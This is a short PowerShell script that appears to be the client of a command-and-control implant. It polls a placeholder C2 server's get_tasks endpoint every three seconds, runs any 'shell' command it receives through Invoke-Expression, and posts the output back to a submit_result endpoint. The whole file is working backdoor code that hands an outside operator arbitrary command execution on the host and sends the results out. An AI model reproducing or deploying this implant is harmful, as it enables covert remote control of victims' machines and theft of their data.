$Server = "http://< YOUR C2 IP >:8080"

# This client communnicates with the C2s endpoints to create and grab tasks

function Fetch-Tasks {
    try {
		# Grab tasks from endpoint if any
        $response = Invoke-RestMethod -Uri "$Server/get_tasks" -Method GET
        return $response.tasks
    } catch {
        Write-Warning "[!] Error fetching tasks: $_"
        return @()
    }
}

function Execute-Command {
    param (
        [Parameter(Mandatory)]
        [object]$Task
    )
	
	# Make sure it's executing
    Write-Host "[+] Executing Task #$($Task.id): $($Task.command)"
    $output = ""

    try {
        if ($Task.command -like "shell *") {
            $cmd = $Task.command -replace "^shell ", ""
            $output = Invoke-Expression $cmd 2>&1 | Out-String
        } else {
            $output = "Unsupported command"
        }
    } catch {
        $output = "Error: $_"
    }

    $result = @{
        id     = $Task.id
        output = $output.Trim()
    }

    try {
        Invoke-RestMethod -Uri "$Server/submit_result" -Method POST -Body ($result | ConvertTo-Json -Depth 5) -ContentType "application/json"
		# Submit Results to API endpoint
        Write-Host "[+] Submitted result for Task #$($Task.id)"
    } catch {
        Write-Warning "[!] Error submitting result: $_"
    }
}

function Main {
    while ($true) {
        $tasks = Fetch-Tasks
        foreach ($task in $tasks) {
            Execute-Command -Task $task
        }
        Start-Sleep -Seconds 3
    }
}

Main
